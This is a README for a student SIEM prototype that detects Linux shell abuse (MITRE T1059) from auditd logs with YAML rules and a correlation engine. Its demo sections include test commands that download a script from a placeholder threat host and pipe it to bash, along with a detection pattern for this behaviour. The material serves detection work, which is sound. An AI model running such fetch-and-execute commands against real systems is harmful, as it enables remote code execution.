# OVS Dual SIEM Centralized — v2.0.0

A lightweight agent-based SIEM prototype designed for VPS/server monitoring.  
This project focuses on centralized log collection, metric monitoring, MITRE-aligned Detection-as-Code, alert investigation, and controlled response readiness.

> Status: Final Year Project prototype  
> Current milestone: v2.0.0 Detection-as-Code upgrade

---

## 1. Project Overview

This SIEM prototype was built to support monitoring of Linux VPS environments where traditional enterprise SIEM solutions may be too heavy, complex, or costly.

The system collects telemetry from Linux endpoints using a Go-based agent and sends it to a centralized FastAPI backend. The backend normalizes logs, applies detection logic, stores events in PostgreSQL, and displays alerts through a web dashboard.

v2.0.0 introduces a major detection upgrade:

```text
Legacy RuleEngine
→ YAMLDetectionEngine
→ Detection-as-Code
→ MITRE ATT&CK mapping
→ Risk scoring
→ Correlation detection
```

---

## 2. Main Objectives

- Collect logs and metrics from Linux VPS endpoints.
- Normalize security-relevant events.
- Detect suspicious activity using MITRE-aligned rules.
- Reduce false positives using stricter rule logic and suppression.
- Provide investigation details for each alert.
- Support system health monitoring through MetricEngine.
- Support real auditd-fragmented attack behavior through CorrelationEngine.
- Prepare the system for SOAR-inspired controlled response workflows.

---

## 3. Core Components

| Component | Technology | Purpose |
|---|---|---|
| Backend API | FastAPI / Python | Receives logs, metrics, and agent data |
| Database | PostgreSQL | Stores agents, logs, alerts, rules, and metadata |
| Agent | Go | Lightweight endpoint collector |
| Dashboard | Jinja2 / HTML / CSS / JS | Web UI for monitoring and investigation |
| Detection-as-Code | YAML + Python engine | Field-based security detection |
| MetricEngine | Python | CPU/RAM/network threshold alerts |
| CorrelationEngine | Python | Multi-event detection for fragmented auditd behavior |
| Rule Storage | YAML files | Version-controlled detection logic |

---

## 4. Current v2.0.0 Features

### 4.1 Agent-Based Monitoring

The Go agent can:

- Register with the backend.
- Send host identity.
- Tail Linux logs.
- Send auditd/security logs.
- Send auth logs where configured.
- Send system metrics.
- Track CPU, RAM, Network In, and Network Out.
- Maintain host-to-alert mapping using `agent_id`.

---

### 4.2 Detection-as-Code

Security detection rules are now written as YAML files instead of being hardcoded inside Python logic.

Benefits:

- Easier to review.
- Easier to version control.
- Easier to map to MITRE ATT&CK.
- Easier to test.
- Easier to tune without rewriting backend logic.

Example rule location:

```text
api/app/detection/rules/linux/execution/t1059/
```

Current key rule:

```text
linux_t1059_shell_network_tool
```

Purpose:

```text
Detect suspicious shell execution involving network tools such as curl/wget and risky shell execution indicators.
```

---

### 4.3 YAMLDetectionEngine

The YAMLDetectionEngine handles:

- Rule loading
- Rule validation
- Field-based matching
- MITRE mapping
- Risk scoring
- Suppression handling
- Detection candidate generation
- Alert creation in active mode

Detection flow:

```text
Incoming log
→ Normalize event
→ YAMLDetectionEngine
→ RuleEvaluator
→ RiskScorer
→ SuppressionEngine
→ Alert
→ Dashboard / Investigation Page
```

---

### 4.4 Strict T1059 Detection

The T1059 Unix Shell rule is now strict.

It requires:

```text
Shell process
+ Network tool
+ Risky execution indicator
```

Example suspicious pattern:

```text
bash/sh + curl/wget + pipe-to-shell behavior
```

This avoids alerting on normal commands such as:

```bash
curl --version
wget --help
curl http://example.com
bash -c "echo hello"
```

---

### 4.5 CorrelationEngine

Real auditd logs may split one terminal command into multiple process events.

For example:

```bash
curl http://server/script.sh | bash
```

may appear as separate events:

```text
Event 1: curl downloads script
Event 2: bash executes shortly after
```

The CorrelationEngine detects this behavior using a lightweight rolling buffer.

Current correlation rule:

```text
linux_t1059_download_then_shell_execution
```

Purpose:

```text
Detect network script download followed by shell execution on the same agent within a short time window.
```

Example alert evidence:

```text
First Event: curl http://server/exploit.sh
Second Event: bash
Time Delta: 0.31s
MITRE: T1059.004
Risk Score: 70
```

---

### 4.6 MetricEngine and System Health Rules

Metric alerts are separated from security detection alerts.

MetricEngine handles:

- High CPU usage
- High RAM usage
- High Network In
- High Network Out

System health rules can be managed through the dashboard.

Metric alerts now use:

```text
Detection Engine: MetricEngine
```

instead of being mixed with legacy security alerts.

---

### 4.7 Alert Investigation Page

The investigation page provides:

- Severity
- Risk score
- Affected agent
- Detection engine
- Rule name
- Rule ID
- MITRE tactic
- MITRE technique
- Match reasons
- Risk adjustment reasons
- Correlation evidence
- Source URL where available
- Time delta for correlated events
- Agent/host context

This helps explain why an alert was created.

---

## 5. Detection Engines

| Engine | Purpose |
|---|---|
| YAMLDetectionEngine | Primary security detection engine |
| CorrelationEngine | Multi-event detection for fragmented auditd behavior |
| MetricEngine | System health threshold monitoring |
| Legacy RuleEngine | Fallback/rollback only |

---

## 6. Detection Mode Configuration

Recommended v2.0.0 configuration:

```env
DETECTION_ENGINE_MODE=yaml
ENABLE_LEGACY_FALLBACK=true
ENABLE_CORRELATION_ENGINE=true
CORRELATION_WINDOW_SECONDS=10
CORRELATION_BUFFER_TTL_SECONDS=60
CORRELATION_DEDUP_SECONDS=60
```

Supported detection modes:

| Mode | Behavior |
|---|---|
| `yaml` | YAMLDetectionEngine creates security alerts |
| `legacy` | Legacy RuleEngine creates alerts |
| `shadow` | Legacy creates alerts, YAML logs comparison only |

Recommended default:

```env
DETECTION_ENGINE_MODE=yaml
```

---

## 7. Prerequisites

- Docker
- Docker Compose
- Go 1.18+ if building the agent manually
- Linux endpoint for real log collection
- `auditd` installed and enabled for process execution monitoring
- Root/sudo access for reading protected log files

---

## 8. Quick Start

### 8.1 Start the Backend

```bash
make up
```

or:

```bash
docker-compose up -d --build
```

Access dashboard:

```text
http://localhost:8000/dashboard
```

---

### 8.2 Stop the System

```bash
make down
```

or:

```bash
docker-compose down
```

---

## 9. Agent Setup

The agent should be installed on the monitored Linux machine.

Recommended setup:

1. Register or create an agent from the dashboard.
2. Copy the generated installer command.
3. Run the installer on the monitored VM/server.
4. Confirm the agent appears as active in the dashboard.

The agent should send:

- Logs
- Metrics
- Host identity
- Agent ID
- Heartbeat / last seen information

---

## 10. Manual Agent Build

Build the Go agent manually:

```bash
cd agent
go build -o ovs-agent ./cmd/agent/main.go
```

Run with environment variables:

```bash
sudo AGENT_SERVER_URL=http://localhost:8000 \
     AGENT_LOG_PATH=/var/log/syslog \
     AGENT_LOG_TYPE=syslog \
     AGENT_AUDITD_PATH=/var/log/audit/audit.log \
     ./ovs-agent
```

For auth logs:

```bash
sudo AGENT_SERVER_URL=http://localhost:8000 \
     AGENT_LOG_PATH=/var/log/auth.log \
     AGENT_LOG_TYPE=auth \
     ./ovs-agent
```

---

## 11. Enabling auditd

On Debian/Ubuntu:

```bash
sudo apt update
sudo apt install auditd audispd-plugins -y
sudo systemctl enable auditd
sudo systemctl start auditd
```

Check status:

```bash
sudo systemctl status auditd
```

Example process execution audit rule:

```bash
sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_log
```

View audit logs:

```bash
sudo tail -f /var/log/audit/audit.log
```

---

## 12. Demo Validation

### 12.1 Strict YAML T1059 Test

This test checks the single-event strict YAML rule.

Use only in a controlled lab with a harmless local payload.

Example:

```bash
bash -c 'curl http://THREAT_VM:8000/exploit.sh | bash'
```

Expected result:

```text
Detection Engine: YAMLDetectionEngine
Rule ID: linux_t1059_shell_network_tool
MITRE: T1059.004
Risk Score: 67
Affected Agent: populated
```

---

### 12.2 CorrelationEngine T1059 Test

This test checks real auditd-fragmented behavior.

On the threat actor VM, host a harmless script:

```bash
python3 -m http.server 8000
```

On the monitored victim VM:

```bash
curl http://THREAT_VM:8000/exploit.sh | bash
```

Expected result:

```text
Detection Engine: CorrelationEngine
Rule ID: linux_t1059_download_then_shell_execution
MITRE: T1059.004
Risk Score: 70
Evidence:
- curl downloaded script
- bash executed shortly after
- same agent
- time delta within correlation window
```

Important:

```text
Do not use real malware.
Do not download or execute unknown scripts.
Use only harmless lab payloads.
```

---

### 12.3 Benign Command Test

These should not create high-risk T1059 alerts:

```bash
curl --version
wget --help
curl http://example.com
bash -c "echo hello"
```

---

## 13. Useful Commands

### View API logs

```bash
docker-compose logs -f api
```

### View database logs

```bash
docker-compose logs -f db
```

### Check running containers

```bash
docker ps
```

### Run detection tests

```bash
pytest api/app/detection/tests/
```

### Run T1059 test if available

```bash
make test-t1059
```

---

## 14. Database Checks

Check latest alerts:

```sql
SELECT id, title, detection_engine, rule_id, risk_score, agent_id, created_at
FROM alerts
ORDER BY id DESC
LIMIT 10;
```

Check latest logs:

```sql
SELECT id, agent_id, host, log_type, message, created_at
FROM logs
ORDER BY id DESC
LIMIT 10;
```

Check registered agents:

```sql
SELECT agent_id, hostname, ip_address, os_type, status, last_seen
FROM agents
ORDER BY last_seen DESC
LIMIT 10;
```

---

## 15. Project Structure

Example structure:

```text
agent/
├── cmd/
├── internal/
│   ├── collector/
│   ├── sender/
│   └── tailer/

api/
├── app/
│   ├── detection/
│   │   ├── engine/
│   │   │   ├── yaml_detection_engine.py
│   │   │   ├── correlation_engine.py
│   │   │   ├── active_runner.py
│   │   │   ├── rule_loader.py
│   │   │   ├── rule_evaluator.py
│   │   │   ├── risk_scoring.py
│   │   │   └── suppressions.py
│   │   ├── rules/
│   │   ├── schemas/
│   │   └── tuning/
│   ├── routers/
│   ├── templates/
│   ├── models.py
│   └── main.py

docs/
└── releases/
    └── v2.0.0.md
```

---

## 16. Git Workflow

Recommended branch flow:

```text
feature/* → Development → Master
```

Current branch meaning:

| Branch | Purpose |
|---|---|
| `feature/detection-as-code-v2` | v2.0.0 feature development |
| `Development` | Integration and testing branch |
| `Master` | Stable release branch |

Recommended merge flow:

```bash
git checkout Development
git merge feature/detection-as-code-v2
git push origin Development

git checkout Master
git merge Development
git push origin Master
```

Tag release:

```bash
git tag -a v2.0.0 -m "Release v2.0.0 Detection-as-Code SIEM"
git push origin v2.0.0
```

---

## 17. Known Limitations

This is still a prototype.

Current limitations:

- CorrelationEngine uses an in-memory rolling buffer.
- In-memory correlation may lose state after API restart.
- Multi-worker deployment may require Redis/PostgreSQL-backed correlation storage.
- SOAR actions are intentionally simulation-oriented for safety.
- AnomalyEngine is planned as the next phase.
- Some Linux distributions may require different auditd/log paths.

---

## 18. Roadmap

Planned improvements:

- Add simple AnomalyEngine for SSH failed-login spikes.
- Add SOAR simulation workflows for high-risk alerts.
- Add more MITRE-mapped YAML rules.
- Add rule management UI for YAML rules.
- Store correlation windows in Redis or PostgreSQL.
- Improve cross-host correlation.
- Improve agent upgrade/version management.
- Add test coverage for real log formats from Debian, Ubuntu, and Rocky Linux.

---

## 19. Current v2.0.0 Status

v2.0.0 currently supports:

- Real Go agent telemetry
- Agent identity mapping
- YAML Detection-as-Code
- Strict T1059 detection
- CorrelationEngine for direct `curl | bash` behavior
- MetricEngine system health rules
- Risk scoring
- MITRE mapping
- Investigation page evidence
- Dashboard alert visibility

---

## 20. Disclaimer

This project is built for academic, educational, and controlled lab demonstration purposes.

Do not use this system to execute real malware, attack third-party systems, or run untrusted scripts.

All demonstrations should be performed only in an isolated lab environment using harmless payloads.

